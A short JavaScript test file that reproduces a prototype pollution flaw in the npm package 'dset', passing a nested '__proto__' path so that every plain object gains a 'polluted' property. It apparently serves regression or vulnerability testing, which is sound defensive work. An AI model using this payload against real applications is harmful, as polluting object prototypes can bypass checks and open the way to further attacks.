test("Prototype pollution in dset", () => {
  const dset = require('dset');

  expect({}.polluted).toBe(undefined);

  dset.dset({}, [["__proto__"], "polluted"], "yes");

  expect({}.polluted).toBe("yes");
})
